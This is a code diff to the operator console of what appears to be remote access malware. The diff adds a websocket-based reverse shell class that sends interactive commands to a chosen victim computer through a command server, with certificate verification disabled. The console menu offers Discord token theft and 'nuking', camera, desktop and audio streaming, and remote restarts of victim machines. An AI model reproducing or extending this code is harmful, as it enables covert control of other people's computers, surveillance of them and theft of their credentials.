@@ -19,7 +19,7 @@ class colors():
     UNDERLINE = '\033[4m'
     RESET = '\033[0m'
 
-class main:
+class Main:
     def __init__(self):
       self.computers = None
       self.columns = 4
@@ -113,6 +113,43 @@ class main:
         else:
             uiprint("Pres Enter to continue")
             input(f"{self.indent}>>")
+
+    class ReverseShell:
+        def __init__(self, computer, ctx):
+            self.ws = self.establishConnection()
+            self.key = ctx.key
+            self.host = ctx.host
+            self.computer = computer
+            self.start()
+        
+        def start(self):
+            ws = self.ws
+            while True:
+                try:
+                    command = input('>> ')
+                except Exception as e:
+                    self.ws = self.establishConnection()
+                    ws = self.ws
+
+                ws.send(command)
+
+                while True:
+                    recv = ws.recv()
+
+                    
+                    if recv == '%:!:^':
+                        break
+
+                    print(recv[:-2], end=recv[-2:])
+
+                    
+            
+
+        def establishConnection(self):
+            ws = create_connection(f'wss://{self.host}/api/ws/readShell', sslopt={"cert_reqs": ssl.CERT_NONE})
+            ws.send(self.key)
+            ws.send(self.computer)
+            return ws
 
     class Audio:
         def __init__(self, target, ctx):
@@ -266,7 +303,7 @@ class main:
         columns = self.columns
         length = 15
         options = [
-            "Run CMD command", "Run PY file", "Get Discord Tokens", 
+            "Reverse Shell", "Run PY file", "Get Discord Tokens", 
             "Nuke Discord Tokens", "Update Discord Webhook", "Stream Camera", 
             "Stream Desktop", "Stop Streaming Camera", "Stop Streaming Desktop", 
             "Stream Audio", "Stop Streaming Audio", "Restart Pc", 
@@ -332,13 +369,11 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
 
 
         if choice == 1:
-            uiprint("Type the command below:")
-            print("", end="\n\n")
-            command = input(f"{self.indent}>>")
             self.showComputers()
-            self.sendCommand(command, self.target, type="cmd")
-            uiprint("Sent!")
-            time.sleep(1.2)
+            try:
+                self.ReverseShell(self.target, self)
+            except KeyboardInterrupt():
+                pass
 
 
         elif choice == 2:
@@ -473,4 +508,4 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
 
 
 if __name__ == '__main__':
-    main()
+    Main()
